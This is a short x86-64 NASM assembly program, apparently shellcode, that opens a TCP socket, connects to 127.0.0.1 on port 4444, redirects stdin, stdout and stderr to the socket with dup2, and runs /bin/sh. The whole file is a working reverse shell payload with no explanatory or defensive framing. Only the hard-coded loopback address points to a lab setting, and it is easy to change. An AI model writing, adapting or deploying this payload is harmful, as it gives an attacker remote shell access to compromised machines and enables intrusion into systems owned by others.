BITS 64

global _start

segment .bss
    struc sockaddr
        sin_family: resw    1
        sin_port:   resw    1
        sin_addr:   resd    1
    endstruc
    

segment .rodata
    binsh db "/bin/sh",0x0

sockaddr_struc:
    istruc sockaddr
        at sin_family, dw   0x2
        at sin_port, dw 0x5c11
        at sin_addr, dd 0x100007f
    iend

_start:
    mov rax,0x29
    mov rdi,0x2
    mov rsi,0x1
    mov rdx,0
    syscall ; socket
    push rax

    mov rax,0x2a    
    pop rdi
    push rdi
    mov rsi,sockaddr_struc
    mov rdx,0x10
    syscall ; connect

    mov rax,0x21
    pop rdi ; old fd that the socket gave us
    push rdi    ; we save it on the stack
    mov rsi,0x2 ; new fd
    syscall ; dup2

    mov rax,0x21
    pop rdi ; socket fd
    push rdi    ; backup of fd
    mov rsi,0x1 ; new fd
    syscall ; dup2

    mov rax,0x21
    pop rdi ; socket fd
    mov rsi,0x0 ; new fd
    syscall ; dup2

    mov rax,0x3b
    mov rdi,binsh
    xor rsi,rsi
    xor rdx,rdx
    syscall ; execve("/bin/sh",[],"")
